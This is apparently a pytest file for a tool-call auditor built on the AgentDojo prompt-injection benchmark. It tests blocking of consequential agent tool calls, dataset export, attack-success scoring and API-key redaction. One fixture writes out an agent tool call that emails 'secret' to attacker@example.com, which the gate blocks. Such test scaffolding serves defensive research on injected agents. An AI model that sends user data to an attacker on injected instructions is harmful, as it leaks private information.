import json
import importlib.util
from pathlib import Path
import sys
from types import SimpleNamespace

import pytest
from agentdojo.functions_runtime import FunctionCall, FunctionsRuntime
from agentdojo.attacks.base_attacks import get_model_name_from_pipeline
from agentdojo.types import ChatAssistantMessage, ChatSystemMessage, text_content_block_from_string
from openai import OpenAI

from tool_call_auditor.config import PilotConfig
from tool_call_auditor.demo import BENIGN_DOCUMENT, DemoEnvironment, build_runtime
import tool_call_auditor.deepseek_llm as deepseek_module
from tool_call_auditor.deepseek_llm import DeepSeekLLM
from tool_call_auditor.data_export import export_dataset
from tool_call_auditor.executor import AuditedToolsExecutor
from tool_call_auditor.identifiers import episode_identifier
from tool_call_auditor.workspace_runner import run, validate_config


def test_workspace_manifest_is_valid_without_model() -> None:
    config = PilotConfig.from_yaml(Path("configs/workspace_pilot.yaml"))
    plan = validate_config(config, require_model=False)

    assert plan["suite"] == "workspace"
    assert plan["provider"] == "deepseek"
    assert plan["model"] == "deepseek-flash"
    assert plan["benchmark_version"] == "v1.2.2"
    assert plan["planned_primary_episodes"] == 120
    assert plan["planned_attack_goal_checks"] == 18
    assert plan["planned_total_agent_runs"] == 138


def test_nonempty_batch_requires_explicit_overwrite(tmp_path: Path) -> None:
    config = PilotConfig.from_yaml(Path("configs/experiment.yaml"))
    config.output_dir = tmp_path / "existing-batch"
    config.output_dir.mkdir()
    (config.output_dir / "keep.json").write_text("preserve", encoding="utf-8")

    with pytest.raises(FileExistsError, match="--overwrite"):
        run(config)

    assert (config.output_dir / "keep.json").read_text(encoding="utf-8") == "preserve"


def test_executor_blocks_only_consequential_call_in_parallel_batch(tmp_path: Path) -> None:
    env = DemoEnvironment(document=BENIGN_DOCUMENT, sent_emails=[])
    runtime = build_runtime()
    messages = [
        ChatAssistantMessage(
            role="assistant",
            content=None,
            tool_calls=[
                FunctionCall(function="read_document", args={}, id="read"),
                FunctionCall(
                    function="send_email",
                    args={"recipient": "attacker@example.com", "body": "secret"},
                    id="send",
                ),
            ],
        )
    ]
    log_path = tmp_path / "decisions.jsonl"
    executor = AuditedToolsExecutor("BLOCK", log_path, {"send_email"})

    _, _, post_env, output_messages, _ = executor.query("user request", runtime, env, messages)

    assert post_env.sent_emails == []
    assert len(output_messages) == 3
    assert output_messages[1]["error"] is None
    assert output_messages[2]["error"] == "Blocked by fixed authorization policy."
    records = [json.loads(line) for line in log_path.read_text().splitlines()]
    proposals = [record for record in records if record["event_type"] == "proposal"]
    results = {
        record["call_id"]: record
        for record in records
        if record["event_type"] == "execution_result"
    }
    assert proposals[0]["gate_decision"] == "ALLOW_READ_ONLY"
    assert results[proposals[0]["call_id"]]["execution_status"] == "succeeded"
    assert results[proposals[0]["call_id"]]["executed"] is True
    assert proposals[1]["gate_decision"] == "BLOCK"
    assert results[proposals[1]["call_id"]]["execution_status"] == "blocked"
    assert results[proposals[1]["call_id"]]["attempted"] is False
    assert proposals[0]["call_id"] != proposals[1]["call_id"]


def test_episode_ids_are_unique_across_repeated_runs() -> None:
    parts = (1, "ALLOW", "workspace", "user_task_1", None, None)
    first = episode_identifier("run-one", *parts)
    second = episode_identifier("run-two", *parts)

    assert first != second


def test_tool_error_is_not_recorded_as_success(tmp_path: Path) -> None:
    def fail() -> str:
        """A function that fails to exercise tool error logging."""
        raise RuntimeError("tool failed")

    runtime = FunctionsRuntime()
    runtime.register_function(fail)
    messages = [
        ChatAssistantMessage(
            role="assistant",
            content=None,
            tool_calls=[FunctionCall(function="fail", args={}, id="provider-call")],
        )
    ]
    log_path = tmp_path / "tool-errors.jsonl"
    executor = AuditedToolsExecutor("ALLOW", log_path, set())

    _, _, _, output_messages, _ = executor.query("request", runtime, messages=messages)

    assert output_messages[-1]["error"] == "RuntimeError: tool failed"
    records = [json.loads(line) for line in log_path.read_text().splitlines()]
    result = next(record for record in records if record["event_type"] == "execution_result")
    assert result["execution_status"] == "error"
    assert result["attempted"] is True
    assert result["tool_succeeded"] is False
    assert result["executed"] is False


def test_raw_call_export_excludes_future_observations(tmp_path: Path) -> None:
    source = tmp_path / "source"
    condition = source / "runs" / "run-1" / "repeat-1" / "allow"
    trace_dir = condition / "deepseek-flash-audit-allow" / "workspace" / "user_task_1" / "none"
    trace_dir.mkdir(parents=True)
    (source / "runs" / "run-1" / "run_manifest.json").write_text(
        json.dumps({"run_id": "run-1"}), encoding="utf-8"
    )
    (condition / "tool_call_decisions.jsonl").write_text(
        "\n".join(
            json.dumps(
                {
                    "event_type": event,
                    "run_id": "run-1",
                    "episode_id": "episode-1",
                    "episode_kind": "primary",
                    "call_id": "run-1:call-1",
                    "provider_call_id": "provider-call",
                    "suite_name": "workspace",
                    "user_task_id": "user_task_1",
                    "injection_task_id": None,
                    "attack_type": None,
                    "consequential": True,
                    "tool_name": "send_email",
                    "tool_arguments": {"body": "hello"},
                    "original_user_request": "Send the message",
                    "observation_provenance": [
                        {"tool_name": "read_file", "content": "Only a prior observation"}
                    ],
                    "execution_status": status,
                    "label": None,
                }
            )
            for event, status in (
                ("proposal", "not_attempted"),
                ("execution_result", "succeeded"),
            )
        )
        + "\n",
        encoding="utf-8",
    )
    with (condition / "tool_call_decisions.jsonl").open("a", encoding="utf-8") as stream:
        stream.write(
            json.dumps(
                {
                    "user_task_id": "injection_task_0",
                    "consequential": True,
                    "tool_name": "send_email",
                    "tool_arguments": {},
                }
            )
            + "\n"
        )
    (trace_dir / "none.json").write_text(
        json.dumps(
            {
                "suite_name": "workspace",
                "user_task_id": "user_task_1",
                "injection_task_id": None,
                "attack_type": None,
                "utility": True,
                "security": True,
                "messages": [
                    {
                        "role": "tool",
                        "content": [{"type": "text", "content": "FUTURE_OBSERVATION_SECRET"}],
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    calls_path, episodes_path = export_dataset(source, tmp_path / "export")
    raw_calls = calls_path.read_text(encoding="utf-8")
    episode = json.loads(episodes_path.read_text(encoding="utf-8"))

    assert "FUTURE_OBSERVATION_SECRET" not in raw_calls
    assert "Only a prior observation" in raw_calls
    call = json.loads(raw_calls)
    assert call["label"] is None
    assert call["execution_status"] == "succeeded"
    assert len([line for line in raw_calls.splitlines() if line.strip()]) == 1
    assert episode["agentdojo_context"]["messages"][0]["role"] == "tool"


@pytest.mark.parametrize(
    ("user_task_id", "injection_task_id", "attack_type", "security", "expected"),
    [
        ("user_task_33", "injection_task_0", "important_instructions", False, False),
        ("user_task_33", "injection_task_0", "important_instructions", True, True),
        ("user_task_33", None, None, True, None),
        ("injection_task_0", None, None, True, None),
    ],
)
def test_attack_succeeded_uses_agentdojo_security_semantics(
    tmp_path: Path,
    user_task_id: str,
    injection_task_id: str | None,
    attack_type: str | None,
    security: bool,
    expected: bool | None,
) -> None:
    source = tmp_path / "source"
    trace_dir = (
        source
        / "runs"
        / "run-1"
        / "repeat-1"
        / "allow"
        / "pipeline"
        / "workspace"
        / user_task_id
        / (attack_type or "none")
    )
    trace_dir.mkdir(parents=True)
    (source / "runs" / "run-1" / "run_manifest.json").write_text(
        json.dumps({"run_id": "run-1"}), encoding="utf-8"
    )
    injection_filename = injection_task_id or "none"
    (trace_dir / f"{injection_filename}.json").write_text(
        json.dumps(
            {
                "suite_name": "workspace",
                "user_task_id": user_task_id,
                "injection_task_id": injection_task_id,
                "attack_type": attack_type,
                "utility": True,
                "security": security,
                "messages": [],
            }
        ),
        encoding="utf-8",
    )

    _, episodes_path = export_dataset(source, tmp_path / "export")
    episode = json.loads(episodes_path.read_text(encoding="utf-8"))

    assert episode["agentdojo_security_result"] is security
    assert episode["attack_succeeded"] is expected


def test_export_only_does_not_call_runner(tmp_path: Path, monkeypatch) -> None:
    script_path = Path(__file__).parents[1] / "scripts" / "collect_data.py"
    spec = importlib.util.spec_from_file_location("collect_data_under_test", script_path)
    assert spec is not None and spec.loader is not None
    collect_data = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(collect_data)

    source = tmp_path / "source"
    trace = source / "run" / "deepseek" / "workspace" / "user_task_1" / "none"
    trace.mkdir(parents=True)
    (trace / "none.json").write_text(
        json.dumps(
            {
                "suite_name": "workspace",
                "user_task_id": "user_task_1",
                "injection_task_id": None,
                "attack_type": None,
                "utility": True,
                "messages": [],
            }
        ),
        encoding="utf-8",
    )
    config_path = tmp_path / "config.yaml"
    config_path.write_text(
        f"suite: workspace\nuser_tasks: [user_task_1]\ninjection_tasks: [injection_task_0]\n"
        f"consequential_tools: [send_email]\noutput_dir: {source}\n"
        f"export_dir: {tmp_path / 'export'}\n",
        encoding="utf-8",
    )
    monkeypatch.setattr(
        collect_data,
        "run",
        lambda *args, **kwargs: (_ for _ in ()).throw(AssertionError("runner called")),
    )
    monkeypatch.setattr(
        sys,
        "argv",
        ["collect_data.py", "--config", str(config_path), "--export-only"],
    )

    collect_data.main()

    assert (tmp_path / "export" / "episodes.jsonl").is_file()


def test_deepseek_adapter_uses_system_role() -> None:
    message = ChatSystemMessage(
        role="system", content=[text_content_block_from_string("Follow the user request.")]
    )
    converted = DeepSeekLLM._to_deepseek_message(message)

    assert converted["role"] == "system"


def test_deepseek_adapter_accepts_official_client() -> None:
    llm = DeepSeekLLM(
        OpenAI(api_key="test-key", base_url="https://api.deepseek.com"),
        model="deepseek-flash",
    )

    assert llm.name == "deepseek-flash"


def test_deepseek_request_telemetry_saves_usage_and_redacts_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    class Usage:
        def model_dump(self, mode: str) -> dict:
            return {
                "prompt_tokens": 12,
                "completion_tokens": 4,
                "total_tokens": 16,
                "prompt_tokens_details": {"cached_tokens": 2},
            }

    def successful_request(*args, **kwargs):
        return SimpleNamespace(
            choices=[
                SimpleNamespace(
                    message=SimpleNamespace(content="done", tool_calls=None)
                )
            ],
            usage=Usage(),
        )

    telemetry_path = tmp_path / "api_requests.jsonl"
    client = OpenAI(api_key="local-test-key", base_url="https://api.deepseek.com")
    monkeypatch.setattr(deepseek_module, "chat_completion_request", successful_request)
    llm = DeepSeekLLM(client, telemetry_path=telemetry_path, run_id="run-one")

    llm.query("request", FunctionsRuntime())

    record = json.loads(telemetry_path.read_text(encoding="utf-8"))
    assert record["usage"]["prompt_tokens"] == 12
    assert record["usage"]["prompt_tokens_details"]["cached_tokens"] == 2
    assert record["request_duration_seconds"] >= 0
    assert record["cost"] is None
    assert "local-test-key" not in telemetry_path.read_text(encoding="utf-8")
    assert "authorization" not in telemetry_path.read_text(encoding="utf-8").lower()

    def failed_request(request_client, *args, **kwargs):
        raise RuntimeError(f"request failed with key {request_client.api_key}")

    monkeypatch.setattr(deepseek_module, "chat_completion_request", failed_request)
    with pytest.raises(RuntimeError):
        llm.query("request", FunctionsRuntime())
    error_record = json.loads(telemetry_path.read_text(encoding="utf-8").splitlines()[-1])
    assert error_record["error"]["type"] == "RuntimeError"
    assert error_record["error"]["message"] == "request failed with key [REDACTED]"
    assert error_record["usage"] is None


def test_agentdojo_attack_can_address_deepseek() -> None:
    class Pipeline:
        name = "deepseek-flash-audit-allow"

    assert get_model_name_from_pipeline(Pipeline()) == "DeepSeek"
